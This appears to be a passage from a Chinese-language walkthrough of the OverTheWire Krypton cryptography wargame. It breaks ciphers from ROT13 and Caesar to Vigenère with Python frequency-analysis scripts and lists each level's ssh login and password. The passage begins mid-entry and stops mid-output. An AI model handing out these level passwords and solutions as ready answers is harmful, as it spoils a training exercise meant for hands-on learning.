; done > plain $ ./encrypt6 plain cipher $ cat cipher EICTDGYIYZKTHNSIRFXYCPFUEOCKRNEICTDGYIYZKTHNSIRFXYCPFUEOCKRNEICT \u7531\u6b64\u53ef\u77e5\uff0c\u4f2a\u968f\u673a\u5e8f\u5217\u7684\u5468\u671f\u4e3a 30 \u5b57\u8282 1 2 3 4 $ for i in $( seq 1 30 ) ; do echo -n B ; done > plain $ ./encrypt6 plain cipher $ cat cipher FJDUEHZJZALUIOTJSGYZDQGVFPDLSO \u5bf9\u6bd4 A \u548c B \u4e00\u4e2a\u5468\u671f\u7684\u52a0\u5bc6\u7ed3\u679c\uff0c\u6ce8\u610f\u5230 B \u7684\u52a0\u5bc6\u7ed3\u679c\u53ea\u662f\u5728 A \u7684\u57fa\u7840\u4e0a\u5b57\u6bcd\u8868\u4f4d\u7f6e\u540e\u79fb\u4e86\u4e00\u4f4d\uff08\u6ce8\u610f\u4e0d\u662f \u5f02\u6216 \uff0c\u4e0d\u8981\u88ab\u60ef\u6027\u601d\u7ef4\u5e26\u504f\u4e86\uff09\uff0c\u5373 30 \u4e2a A \u52a0\u5bc6\u7684\u7ed3\u679c\u5c31\u662f\u4e00\u4e2a\u5468\u671f\u7684\u5bc6\u94a5\uff01 1 2 A: EICTDGYIYZKTHNSIRFXYCPFUEOCKRN B: FJDUEHZJZALUIOTJSGYZDQGVFPDLSO \u90a3\u4e48\u76f4\u63a5\u5bc6\u6587\u51cf\u53bb\u5bc6\u94a5\u5c31\u597d\u4e86\uff01 1 2 3 4 5 m , c , k = '' , 'PNUKLYLWRQKGKBE' , 'EICTDGYIYZKTHNSIRFXYCPFUEOCKRN' for i in range ( len ( c )): m += chr (( 26 + ord ( c [ i ]) - ord ( k [ i ])) % 26 + ord ( 'A' )) print ( m ) # LFSRISNOTRANDOM","title":"Krypton"},{"location":"wargames/krypton/#level-0","text":"1 2 $ echo S1JZUFRPTklTR1JFQVQ = | base64 --decode KRYPTONISGREAT","title":"Level 0"},{"location":"wargames/krypton/#level-1","text":"Username krypton1 Password KRYPTONISGREAT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 $ ssh krypton1@krypton.labs.overthewire.org -p 2231 $ ls /krypton krypton1 krypton2 krypton3 krypton4 krypton5 krypton6 $ ls /krypton/krypton1 krypton2 README $ cat /krypton/krypton1/README Welcome to Krypton! This game is intended to give hands on experience with cryptography and cryptanalysis. The levels progress from classic ciphers, to modern, easy to harder. Although there are excellent public tools, like cryptool,to perform the simple analysis, we strongly encourage you to try and do these without them for now. We will use them in later excercises. ** Please try these levels without cryptool first ** The first level is easy. The password for level 2 is in the file 'krypton2' . It is 'encrypted' using a simple rotation called ROT13. It is also in non-standard ciphertext format. When using alpha characters for cipher text it is normal to group the letters into 5 letter clusters, regardless of word boundaries. This helps obfuscate any patterns. This file has kept the plain text word boundaries and carried them to the cipher text. Enjoy! $ cd /krypton/krypton1 $ cat krypton2 | tr 'a-zA-Z' 'n-za-mN-ZA-M' LEVEL TWO PASSWORD ROTTEN","title":"Level 1"},{"location":"wargames/krypton/#level-2","text":"Username krypton2 Password ROTTEN 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 $ ssh krypton2@krypton.labs.overthewire.org -p 2231 $ cd /krypton/krypton2 $ ls encrypt keyfile.dat krypton3 README $ cat README Krypton 2 ROT13 is a simple substitution cipher. Substitution ciphers are a simple replacement algorithm. In this example of a substitution cipher, we will explore a 'monoalphebetic' cipher. Monoalphebetic means, literally, \"one alphabet\" and you will see why. This level contains an old form of cipher called a 'Caesar Cipher' . A Caesar cipher shifts the alphabet by a set number. For example: plain: a b c d e f g h i j k ... cipher: G H I J K L M N O P Q ... In this example, the letter 'a' in plaintext is replaced by a 'G' in the ciphertext so, for example, the plaintext 'bad' becomes 'HGJ' in ciphertext. The password for level 3 is in the file krypton3. It is in 5 letter group ciphertext. It is encrypted with a Caesar Cipher. Without any further information, this cipher text may be difficult to break . You do not have direct access to the key, however you do have access to a program that will encrypt anything you wish to give it using the key. If you think logically, this is completely easy. One shot can solve it! Have fun. Additional Information: The ` encrypt ` binary will look for the keyfile in your current working directory. Therefore, it might be best to create a working direcory in /tmp and in there a link to the keyfile. As the ` encrypt ` binary runs setuid ` krypton3 ` , you also need to give ` krypton3 ` access to your working directory. Here is an example: krypton2@melinda:~$ mktemp -d /tmp/tmp.Wf2OnCpCDQ krypton2@melinda:~$ cd /tmp/tmp.Wf2OnCpCDQ krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ln -s /krypton/krypton2/keyfile.dat krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls keyfile.dat krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ chmod 777 . krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ /krypton/krypton2/encrypt /etc/issue krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls ciphertext keyfile.dat $ cat krypton3 OMQEMDUEQMEK $ ./encrypt usage: encrypt foo - where foo is the file containing the plaintext $ mktemp -d /tmp/tmp.aHZs9AbfRo $ cd /tmp/tmp.aHZs9AbfRo $ ln -s /krypton/krypton2/keyfile.dat $ chmod 777 . $ echo abcABC > test $ /krypton/krypton2/encrypt test $ cat ciphertext MNOMNO $ cd /krypton/krypton2 $ cat krypton3 | tr 'A-Z' 'O-ZA-N' CAESARISEASY","title":"Level 2"},{"location":"wargames/krypton/#level-3","text":"Username krypton3 Password CAESARISEASY 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 $ ssh krypton3@krypton.labs.overthewire.org -p 2231 $ cd /krypton/krypton3 $ ls found1 found2 found3 HINT1 HINT2 krypton4 README $ cat README Well done . You\u2018ve moved past an easy substitution cipher. Hopefully you just encrypted the alphabet a plaintext to fully expose the key in one swoop. The main weakness of a simple substitution cipher is repeated use of a simple key. In the previous exercise you were able to introduce arbitrary plaintext to expose the key. In this example, the cipher mechanism is not available to you, the attacker. However, you have been lucky. You have intercepted more than one message. The password to the next level is found in the file 'krypton4' . You have also found 3 other files. ( found1, found2, found3 ) You know the following important details: - The message plaintexts are in English ( *** very important ) - They were produced from the same key ( *** even better! ) Enjoy. $ cat HINT1 Some letters are more prevalent in English than others. $ cat HINT2 \"Frequency Analysis\" is your friend. $ cat found1 CGZNL YJBEN QYDLQ ZQSUQ NZCYD SNQVU BFGBK GQUQZ QSUQN UZCYD SNJDS UDCXJ ZCYDS NZQSU QNUZB WSBNZ QSUQN UDCXJ CUBGS BXJDS UCTYV SUJQG WTBUJ KCWSV LFGBK GSGZN LYJCB GJSZD GCHMS UCJCU QJLYS BXUMA UJCJM JCBGZ CYDSN CGKDC ZDSQZ DVSJJ SNCGJ DSYVQ CGJSO JCUNS YVQZS WALQV SJJSN UBTSX COSWG MTASN BXYBU CJCBG UWBKG JDSQV YDQAS JXBNS OQTYV SKCJD QUDCX JBXQK BMVWA SNSYV QZSWA LWAKB MVWAS ZBTSS QGWUB BGJDS TSJDB WCUGQ TSWQX JSNRM VCMUZ QSUQN KDBMU SWCJJ BZBTT MGCZQ JSKCJ DDCUE SGSNQ VUJDS SGZNL YJCBG UJSYY SNXBN TSWAL QZQSU QNZCY DSNCU BXJSG CGZBN YBNQJ SWQUY QNJBX TBNSZ BTYVS OUZDS TSUUM ZDQUJ DSICE SGNSZ CYDSN QGWUJ CVVDQ UTBWS NGQYY VCZQJ CBGCG JDSNB JULUJ STQUK CJDQV VUCGE VSQVY DQASJ UMAUJ CJMJC BGZCY DSNUJ DSZQS UQNZC YDSNC USQUC VLANB FSGQG WCGYN QZJCZ SBXXS NUSUU SGJCQ VVLGB ZBTTM GCZQJ CBGUS ZMNCJ LUDQF SUYSQ NSYNB WMZSW TBUJB XDCUF GBKGK BNFAS JKSSG QGWDC USQNV LYVQL UKSNS TQCGV LZBTS WCSUQ GWDCU JBNCS UESGN SUDSN QCUSW JBJDS YSQFB XUBYD CUJCZ QJCBG QGWQN JCUJN LALJD SSGWB XJDSU COJSS GJDZS GJMNL GSOJD SKNBJ STQCG VLJNQ ESWCS UMGJC VQABM JCGZV MWCGE DQTVS JFCGE VSQNQ GWTQZ ASJDZ BGUCW SNSWU BTSBX JDSXC GSUJS OQTYV SUCGJ DSSGE VCUDV QGEMQ ESCGD CUVQU JYDQU SDSKN BJSJN QECZB TSWCS UQVUB FGBKG QUNBT QGZSU QGWZB VVQAB NQJSW KCJDB JDSNY VQLKN CEDJU TQGLB XDCUY VQLUK SNSYM AVCUD SWCGS WCJCB GUBXI QNLCG EHMQV CJLQG WQZZM NQZLW MNCGE DCUVC XSJCT SQGWC GJKBB XDCUX BNTSN JDSQJ NCZQV ZBVVS QEMSU YMAVC UDSWJ DSXCN UJXBV CBQZB VVSZJ SWSWC JCBGB XDCUW NQTQJ CZKBN FUJDQ JCGZV MWSWQ VVAMJ JKBBX JDSYV QLUGB KNSZB EGCUS WQUUD QFSUY SQNSU \u867d\u7136\u5bc6\u6587\u5206\u7ec4\u4e86\uff0c\u4f46\u4ecd\u7136\u662f\u5355\u8868\u4ee3\u6362\u3002\u8bcd\u9891\u5206\u6790\u5c31\u4ea4\u7ed9 quipqiup \u597d\u5566 \u9009\u62e9\u4efb\u610f\u4e00\u4e2a found \u6587\u4ef6\u5185\u5bb9\u52a0\u4e0a krypton4 \u7684\u6587\u4ef6\u5185\u5bb9\u5c31\u53ef\u4ee5\u83b7\u5f97\u660e\u6587\uff1a WELL DONE THE LEVEL FOUR PASSWORD IS BRUTE","title":"Level 3"},{"location":"wargames/krypton/#level-4","text":"Username krypton4 Password BRUTE 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 $ ssh krypton4@krypton.labs.overthewire.org -p 2231 $ cd /krypton/krypton4 $ ls found1 found2 HINT krypton5 README $ cat README | iconv -f ISO8859-1 -t UTF-8 Good job! You more than likely used frequency analysis and some common sense to solve that one. So far we have worked with simple substitution ciphers. They have also been 'monoalphabetic' , meaning using a fixed key, and giving a one to one mapping of plaintext ( P ) to ciphertext ( C ) . Another type of substitution cipher is referred to as 'polyalphabetic' , where one character of P may map to many, or all, possible ciphertext characters. An example of a polyalphabetic cipher is called a Vigen\u00e8re Cipher. It works like this: If we use the key ( K ) 'GOLD' , and P = PROCEED MEETING AS AGREED, then \"add\" P to K, we get C. When adding, if we exceed 25 , then we roll to 0 ( modulo 26 ) . P P R O C E E D M E E T I N G A S A G R E E D K G O L D G O L D G O L D G O L D G O L D G O becomes: P 15 17 14 2 4 4 3 12 4 4 19 8 13 6 0 18 0 6 17 4 4 3 K 6 14 11 3 6 14 11 3 6 14 11 3 6 14 11 3 6 14 11 3 6 14 C 21 5 25 5 10 18 14 15 10 18 4 11 19 20 11 21 6 20 2 8 10 17 So, we get a ciphertext of: VFZFK SOPKS ELTUL VGUCH KR This level is a Vigen\u00e8re Cipher. You have intercepted two longer, english language messages. You also have a key piece of information. You know the key length! For this exercise, the key length is 6 . The password to level five is in the usual place, encrypted with the 6 letter key. Have fun! $ cat HINT Frequency analysis will still work, but you need to analyse it by \"keylength\" . Analysis of cipher text at position 1 , 6 , 12 , etc should reveal the 1st letter of the key, in this case . Treat this as 6 different mono-alphabetic ciphers... Persistence and some good guesses are the key! $ cat found1 YYICS JIZIB AGYYX RIEWV IXAFN JOOVQ QVHDL CRKLB SSLYX RIQYI IOXQT WXRIC RVVKP BHZXI YLYZP DLCDI IKGFJ UXRIP TFQGL CWVXR IEZRV NMYSF JDLCL RXOWJ NMINX FNJSP JGHVV ERJTT OOHRM VMBWN JTXKG JJJXY TSYKL OQZFT OSRFN JKBIY YSSHE LIKLO RFJGS VMRJC CYTCS VHDLC LRXOJ MWFYB JPNVR NWUMZ GRVMF UPOEB XKSDL CBZGU IBBZX MLMKK LOACX KECOC IUSBS RMPXR IPJZW XSPTR HKRQB VVOHR MVKEE PIZEX SDYYI QERJJ RYSLJ VZOVU NJLOW RTXSD LYYNE ILMBK LORYW VAOXM KZRNL CWZRA YGWVH DLCLZ VVXFF KASPJ GVIKW WWVTV MCIKL OQYSW SBAFJ EWRII SFACC MZRVO MLYYI MSSSK VISDY YIGML PZICW FJNMV PDNEH ISSFE HWEIJ PSEEJ QYIBW JFMIC TCWYE ZWLTK WKMBY YICGY WVGBS UKFVG IKJRR DSBJJ XBSWM VVYLR MRXSW BNWJO VCSKW KMBYY IQYYW UMKRM KKLOK YYVWX SMSVL KWCAV VNIQY ISIIB MVVLI DTIIC SGSRX EVYQC CDLMZ XLDWF JNSEP BRROO WJFMI CSDDF YKWQM VLKWM KKLOV CXKFE XRFBI MEPJW SBWFJ ZWGMA PVHKR BKZIB GCFEH WEWSF XKPJT NCYYR TUICX PTPLO VIJVT DSRMV AOWRB YIBIR MVWER QJKWK RBDFY MELSF XPEGQ KSPML IYIBX FJPXR ELPVH RMKFE HLEBJ YMWKM TUFII YSUXE VLJUX YAYWU XRIUJ JXGEJ PZRQS TJIJS IJIJS PWMKK KBEQX USDXC IYIBI YSUXR IPJNM DLBFZ WSIQF EHLYR YVVMY NXUSB SRMPW DMJQN SBIRM VTBIR YPWSP IIIIC WQMVL KHNZK SXMLY YIZEJ FTILY RSFAD SFJIW EVNWZ WOWFJ WSERB NKAKW LTCSX KCWXV OILGL XZYPJ NLSXC YYIBM ZGFRK VMZEH DSRTJ ROGIM RHKPQ TCSCX GYJKB ICSTS VSPFE HGEQF JARMR JRWNS PTKLI WBWVW CXFJV QOVYQ UGSXW BRWCS MSCIP XDFIF OLGSU ECXFJ PENZY STINX FJXVY YLISI MEKJI SEKFJ IEXHF NCPSI PKFVD LCWVA OVCSF JKVKX ESBLM ZJICM LYYMC GMZEX BCMKK LOACX KEXHR MVKBS SSUAK WSSKM VPCIZ RDLCF WXOVL TFRDL CXLRC LMSVL YXGSK LOMPK RGOWD TIXRI PJNIB ILTKV OIQYF SPJCW KLOQQ MRHOW MYYED FCKFV ORGLY XNSPT KLIEL $ cat found2 YYIIA CWVSL PGLVH DSAFD TYYRY YEDRG LYXER BJIEV EPLVX BICNE XRIDT IICXD TIXRI PJNIB ILTYS EWCXE IKVRM VXBIC RRHOE ETFHD LGHBG YZCWZ RQXMU ISDIA YKLOQ DWFQD LCIVA KRBYY IDMLB FSNQY STLYT NJUEQ VCFKT SPCTW AYSBB ZXRLG XRBOE LIUSB SRMPF EMJYR WZPCS UMNJG WVXRE RBRVW IBMVV KRBRR HOLCW WIOPJ JJWVS LJCCC LCFEH DSRTR XOXFJ CECXM KKLOM PGIIK HYSUR YAQMV HSHLT KOXSU BYEDX FJPAY YJIUS PSPGI IKODF JXSJW TLASW FXRMN XFJCM YRGBZ PVKMN EXYXF JWSBI QYRRN OGQCE NICWW SBCMZ PSEGY SISKW RNKFI XFJWM BIQNE GOCMZ IXKWR JJEBI QTGIM YJNRV DLYYP SETPJ WIBGM TBINJ MTUEX HRMVR ISSBZ PVLYA VEFIP DXSYH ZWVEU JYXKH YRRUC IKWCI FRDFC LXINX FJKMX AMTUQ KRGXY SEPBH VVDEG SCCGI CUZJI SSPZP VIBFG SYVBJ VVKRB YYIXQ WORAC AMZCH BYQYR KKMLG LXDLC QZSXA CSKEG EWNEX YXFJW SBIQY RRNJM ZEHRM QTNRC YNUVV KRBSF SXICA VVURC BNLKX GYNEC JMWYI NMBSK QORRN FRSXY SUXRI QHRVO GPTNJ YYLIR XBICK LPVSD SLXCE LIWMV PCIUS BSRMP WLEQP VXGMR MKLOQ QTKLK XQMVA YYJIE SDFCM LRQVW KFVKP MSXXS QCXYI DLMZX LDXFN JAKWT JICUM LIRRN XFTLK RXDZC SPXFJ JGKVC HISGF SYJLO PYZXL OHFJR VDMJD RXDLC FNOGE PINEI MLBYM MLRMV TYSPH IIKXS WVTSG IJUYZ XFJEY DWFNJ TKHBJ ULKRB XNIBI QTTPE QQDRR NXFJE YDWUJ IICSQ RRPVX FFKLO HPTGT OHYQD SCXYX DEXCY XYIZY RNEXR IZFJO OXZZK XRIQH RVOGP TNHSH LTKQS RBMFA VSLLZ XDSMP YMWXM KZPVX FJSEC OCYWS BMRJE ELPCI YMWXM PVIZE UFPJB SKYYI PMPJR WRIDJ RVOHY XGEBO KNXLD KCYZR DSFNJ WDVYB RRNFS WELSQ SUJSR IIJGX KKMTU HSWRF EGOEU FPJBS KYYIP PYRVW KRBTE PIGYR VROEP YFGYZ CWUSB SRMPA SXFII CVIYA VWGLC SJLOP YDUSG RRTJP OINYY ICIIJ GXRIP AVVIW LZXEX HUFIQ KRBXY ICPCU KWYYL ICCER RNCQY VLNEK GLCSZ XGEQI RCVME MKXRI ENIPL ERMVH RIPKR GOMLF CMDXJ JIMZT JNEKL VMTBE XHQTF RKJRJ IXRIW FCPCX YWKIN XMBRV NXFJV QOVYQ UGSXW YYMCA YXKSL IYSVZ ORRKL PNEWK FVDLC YIEFI JJIWD LCDYE NLYWU PIFCJ EAKPI NEKKR FTLVG LCSKL OCQFN FOJMW VXRIK FXVOE RIZXM LRMRX MVMXJ INXFJ ISKHY SUHSZ GIVHD LCKFV OWRFJ JKVYX KLOCA TLPNW CJFRO MRMVV CMBJZ XGEQF MIBCU NUINM RHYEX HUMVR DLCDT VOTRZ GXYXF JVHQI YSUPY SIJUM XXMNK XRIWH FYVHQ JVMDA YXRPC STJIC NICUR RNXFJ IIGIP JDEXC ZNXNK KEJUV YGIXR XDLCG FXDSK YYICM BJJAO VCXFW DICUK LKXLT EIYJR MVQMS SQUGV MKGUS GRYSU JYVYR FQORR NKWOI KJUXR ERYYI SVHTL VXIWR LWDIL INLKX QMRPV ACIFE COCIU SBSRM PHOWN FZVSR EQPMR ETJEX DLCKR MXXCX KMNIY XRMNX FJKMX AMTUQ KRYSU XRIJN FRCLM TBLSW QMRKQ CKFEI KRBQF SUIBY YSEKF YWYVF SYKLO WAFII MVMBJ ESHUJ TEXRM YWPIX FFKMC GCWKE SRLJZ XRIPH RRGIA QZQLH MBEMX XMYYM CKPJR XNMRH YXRIP JWSBI GKNIM ELSFX TYKUF ZOVGY NIWYQ YJXYT UMVVO ACFII SXFNE OSGMZ CHTYK UFZOV GYJES HRMVG YAYWU PIPGT EEPXC WDIKW SWZRQ XFJUM CXYST IMEPJ WYVPW NELSW KNEHD LCSNI KVCFC PBMEM KEXWU JIINX FJJGK VCHIS GJMWP SEGYS TEBVW ZJEVP MAVVY RWTLV LEAPF ROERF KMWIU JCPSP JYICS XQFZH DLCQZ SXAFT NMVPE TWMBW RNNMV PBJTP KVCIK LOWAF IIMVM BWSBM DDFYP SSSUX RERDF YMSSQ URYXH ZDTYZ CWKLO KSQWH YVMYY CGSSQ UFOOG QCINS PYYID MLBFS NQYSS ENPWI VRDIB TEXRI PTTOC FCQFA LYRNW MKQMS PSEVZ FTOSX UNCPX SRRRX DIPXF QEGFK FVDLC KRPVA MZCHX SRMLV DQCFK EVP $ mktemp -d /tmp/tmp.uG3ytoUtVo $ cd /tmp/tmp.uG3ytoUtVo $ cp /krypton/krypton4/found* . $ vi count.py \u6309\u5bc6\u94a5\u957f\u5ea6\u5206\u522b\u7edf\u8ba1\u5404\u4e2a\u4f4d\u4e0a\u7684\u5b57\u6bcd\u9891\u7387\uff0c\u4e00\u822c\u6700\u9ad8\u9891\u7387\u5b57\u6bcd\u5bf9\u5e94\u660e\u6587 E \uff0c\u7531\u6b64\u53ef\u63a8\u51fa\u5bc6\u94a5 \u9700\u8981\u6ce8\u610f found1 \u7684\u957f\u5ea6\u4e0d\u662f 6 \u7684\u500d\u6570\uff0c\u4e0d\u80fd\u76f4\u63a5\u4e0e found2 \u62fc\u63a5\u540e\u8ba1\u7b97 count.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #!/usr/bin/env python3 for i in range ( 1 , 3 ): s = '' with open ( 'found' + str ( i ), 'r' ) as f : s += f . read () s = s . replace ( ' ' , '' ) d = list ( dict () for _ in range ( 6 )) cnt = list ( 0 for _ in range ( 6 )) for i in range ( len ( s )): cnt [ i % 6 ] += 1 try : d [ i % 6 ][ s [ i ]] += 1 except : d [ i % 6 ][ s [ i ]] = 1 key = '' for i in range ( 6 ): for j in d [ i ]: d [ i ][ j ] /= cnt [ i ] d [ i ] = sorted ( d [ i ] . items (), key = lambda kv :( kv [ 1 ], kv [ 0 ]), reverse = True ) key += chr (( 26 + ord ( d [ i ][ 0 ][ 0 ]) - ord ( 'E' )) % 26 + ord ( 'A' )) print ( key ) 1 2 $ python3 count.py FRTKEY \u5728\u6587\u672c\u957f\u5ea6\u4e0d\u591f\u7684\u60c5\u51b5\u4e0b\uff0c\u5b9e\u9645\u5b57\u6bcd\u9891\u7387\u4f1a\u6709\u4e00\u5b9a\u7684\u504f\u5dee\uff0c\u6b64\u65f6\u9700\u6839\u636e\u89e3\u5bc6\u60c5\u51b5\u5e76\u7ed3\u5408\u5e38\u7528\u8bcd\u5bf9\u5bc6\u94a5\u8fdb\u884c\u8c03\u6574 found1 \u4e0e found2 \u5747\u4ee5 YYI \u5f00\u5934\uff0c\u63a8\u6d4b YYI \u5bf9\u5e94\u660e\u6587 THE \uff0c\u8c03\u6574\u5bc6\u94a5\u4e3a FREKEY HCIKV RJOX \u89e3\u5bc6\u4e3a CLEAR TEXT","title":"Level 4"},{"location":"wargames/krypton/#level-5","text":"Username krypton5 Password CLEARTEXT 1 2 3 4 5 6 7 8 9 10 11 12 13 $ ssh krypton5@krypton.labs.overthewire.org -p 2231 $ cd /krypton/krypton5 $ ls found1 found2 found3 krypton6 README $ cat README Frequency analysis can break a known key length as well. Lets try one last polyalphabetic cipher, but this time the key length is unknown. Enjoy. $ cat krypton6 BELOS Z \u7531\u4e8e\u5bc6\u94a5\u957f\u5ea6\u672a\u77e5\uff0c\u9996\u5148\u8981\u63a8\u6d4b\u5bc6\u94a5\u957f\u5ea6\uff0c\u901a\u8fc7 Kasiski \u6d4b\u8bd5 \u6765\u5224\u65ad \u5728\u7ef4\u5409\u5c3c\u4e9a\u52a0\u5bc6\u4e2d\uff0c\u5f53\u660e\u6587\u4e2d\u4e00\u5bf9\u76f8\u540c\u5b57\u6bcd\u7ec4\u95f4\u9694\u5b57\u6bcd\u6570\u4e3a\u5bc6\u94a5\u7684\u500d\u6570\u65f6\uff0c\u5176\u5bf9\u5e94\u7684\u5bc6\u6587\u5b57\u6bcd\u7ec4\u76f8\u540c \u5206\u522b\u5206\u6790 found1 \u3001 found2 \u548c found3 \uff0c\u63a8\u6d4b\u5bc6\u94a5\u957f\u5ea6\u4e3a \\(3\\) \u9700\u8981\u6ce8\u610f Key Length \u662f\u5de5\u5177\u5904\u7406\u540e\u7684\u7ed3\u679c\uff0c\u5b9e\u9645\u5b57\u6bcd\u7ec4\u95f4\u9694\u5747\u5927\u4e8e \\(3\\) File Key Length Distances Matched found1 3 84.18 % found2 3 83.19 % found3 3 78.40 % \u518d\u4f7f\u7528 Level 4 \u7684\u811a\u672c\u5206\u6790\uff0c\u6253\u5370\u8f93\u51fa\u5404\u4e2a\u4f4d\u7684\u5b57\u6bcd\u9891\u7387\uff0c\u53d1\u73b0\u4e0e\u5b57\u6bcd\u9891\u7387\u8868\u4e2d\u7684\u503c\u5dee\u8ddd\u8f83\u5927 count.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #!/usr/bin/env python3 kl = 3 for i in range ( 1 , 4 ): s = '' with open ( 'found' + str ( i ), 'r' ) as f : s += f . read () s = s . replace ( ' ' , '' ) d = list ( dict () for _ in range ( kl )) cnt = list ( 0 for _ in range ( kl )) for i in range ( len ( s )): cnt [ i % kl ] += 1 try : d [ i % kl ][ s [ i ]] += 1 except : d [ i % kl ][ s [ i ]] = 1 for i in range ( kl ): for j in d [ i ]: d [ i ][ j ] /= cnt [ i ] d [ i ] = sorted ( d [ i ] . items (), key = lambda kv :( kv [ 1 ], kv [ 0 ]), reverse = True ) print ( d [ i ]) 1 2 3 4 $ python3 count.py [( 'K' , 0 .08347529812606473 ) , ( 'Y' , 0 .07836456558773425 ) , ( 'O' , 0 .07155025553662692 ) , ( 'D' , 0 .06132879045996593 ) , ( 'P' , 0 .05792163543441227 ) , ( 'C' , 0 .05792163543441227 ) , ( 'S' , 0 .05110732538330494 ) , ( 'T' , 0 .049403747870528106 ) , ( 'Z' , 0 .04599659284497445 ) , ( 'X' , 0 .04599659284497445 ) , ( 'R' , 0 .04599659284497445 ) , ( 'N' , 0 .044293015332197615 ) , ( 'G' , 0 .039182282793867124 ) , ( 'E' , 0 .039182282793867124 ) , ( 'U' , 0 .030664395229982964 ) , ( 'L' , 0 .030664395229982964 ) , ( 'B' , 0 .02555366269165247 ) , ( 'W' , 0 .020442930153321975 ) , ( 'V' , 0 .020442930153321975 ) , ( 'M' , 0 .017035775127768313 ) , ( 'J' , 0 .017035775127768313 ) , ( 'I' , 0 .017035775127768313 ) , ( 'A' , 0 .017035775127768313 ) , ( 'Q' , 0 .013628620102214651 ) , ( 'F' , 0 .013628620102214651 ) , ( 'H' , 0 .005110732538330494 )] [( 'I' , 0 .09215017064846416 ) , ( 'X' , 0 .08191126279863481 ) , ( 'M' , 0 .07679180887372014 ) , ( 'E' , 0 .06825938566552901 ) , ( 'L' , 0 .06484641638225255 ) , ( 'S' , 0 .06143344709897611 ) , ( 'V' , 0 .059726962457337884 ) , ( 'H' , 0 .05460750853242321 ) , ( 'W' , 0 .04778156996587031 ) , ( 'T' , 0 .04778156996587031 ) , ( 'R' , 0 .04436860068259386 ) , ( 'G' , 0 .03924914675767918 ) , ( 'P' , 0 .03754266211604096 ) , ( 'B' , 0 .034129692832764506 ) , ( 'K' , 0 .030716723549488054 ) , ( 'A' , 0 .027303754266211604 ) , ( 'Y' , 0 .023890784982935155 ) , ( 'J' , 0 .023890784982935155 ) , ( 'Z' , 0 .017064846416382253 ) , ( 'O' , 0 .017064846416382253 ) , ( 'F' , 0 .015358361774744027 ) , ( 'C' , 0 .015358361774744027 ) , ( 'D' , 0 .006825938566552901 ) , ( 'N' , 0 .005119453924914676 ) , ( 'U' , 0 .0034129692832764505 ) , ( 'Q' , 0 .0034129692832764505 )] [( 'Y' , 0 .07337883959044368 ) , ( 'L' , 0 .07167235494880546 ) , ( 'R' , 0 .059726962457337884 ) , ( 'P' , 0 .05802047781569966 ) , ( 'V' , 0 .05631399317406143 ) , ( 'F' , 0 .051194539249146756 ) , ( 'A' , 0 .04948805460750853 ) , ( 'U' , 0 .04607508532423208 ) , ( 'S' , 0 .04607508532423208 ) , ( 'C' , 0 .04607508532423208 ) , ( 'G' , 0 .042662116040955635 ) , ( 'Q' , 0 .03924914675767918 ) , ( 'M' , 0 .03924914675767918 ) , ( 'B' , 0 .03924914675767918 ) , ( 'K' , 0 .03583617747440273 ) , ( 'Z' , 0 .034129692832764506 ) , ( 'N' , 0 .034129692832764506 ) , ( 'J' , 0 .034129692832764506 ) , ( 'H' , 0 .02901023890784983 ) , ( 'O' , 0 .027303754266211604 ) , ( 'E' , 0 .025597269624573378 ) , ( 'W' , 0 .017064846416382253 ) , ( 'T' , 0 .015358361774744027 ) , ( 'I' , 0 .011945392491467578 ) , ( 'D' , 0 .011945392491467578 ) , ( 'X' , 0 .005119453924914676 )] \u8c03\u6574\u5bc6\u94a5\u957f\u5ea6\u4e3a \\(3\\) \u7684\u500d\u6570\uff0c\u5f53\u5bc6\u94a5\u957f\u5ea6\u4e3a \\(9\\) \u65f6\uff0c\u53ef\u4ee5\u83b7\u5f97\u8f83\u4e3a\u5408\u7406\u7684\u5b57\u6bcd\u9891\u7387\uff0c\u660e\u6587\u5b57\u6bcd E \u4e00\u822c\u5bf9\u5e94\u9891\u7387\u9760\u524d\u7684\u5bc6\u6587\u5b57\u6bcd\uff0c\u5bc6\u94a5\u4e3a KEYLENGTH 1 2 3 4 5 6 7 8 9 10 $ python3 count.py [( 'C' , 0 .12244897959183673 ) , ( 'O' , 0 .11224489795918367 ) , ( 'K' , 0 .09693877551020408 ) , ( 'D' , 0 .09183673469387756 ) , ( 'Y' , 0 .08163265306122448 ) , ( 'R' , 0 .07142857142857142 ) , ( 'S' , 0 .0663265306122449 ) , ( 'B' , 0 .061224489795918366 ) , ( 'X' , 0 .04591836734693878 ) , ( 'V' , 0 .03571428571428571 ) , ( 'P' , 0 .030612244897959183 ) , ( 'N' , 0 .030612244897959183 ) , ( 'E' , 0 .025510204081632654 ) , ( 'F' , 0 .02040816326530612 ) , ( 'W' , 0 .015306122448979591 ) , ( 'Q' , 0 .015306122448979591 ) , ( 'M' , 0 .015306122448979591 ) , ( 'L' , 0 .015306122448979591 ) , ( 'Z' , 0 .01020408163265306 ) , ( 'U' , 0 .01020408163265306 ) , ( 'I' , 0 .01020408163265306 ) , ( 'G' , 0 .01020408163265306 ) , ( 'A' , 0 .00510204081632653 )] [( 'I' , 0 .11734693877551021 ) , ( 'S' , 0 .10204081632653061 ) , ( 'X' , 0 .08163265306122448 ) , ( 'W' , 0 .08163265306122448 ) , ( 'V' , 0 .08163265306122448 ) , ( 'M' , 0 .07653061224489796 ) , ( 'E' , 0 .07142857142857142 ) , ( 'R' , 0 .0663265306122449 ) , ( 'L' , 0 .061224489795918366 ) , ( 'H' , 0 .03571428571428571 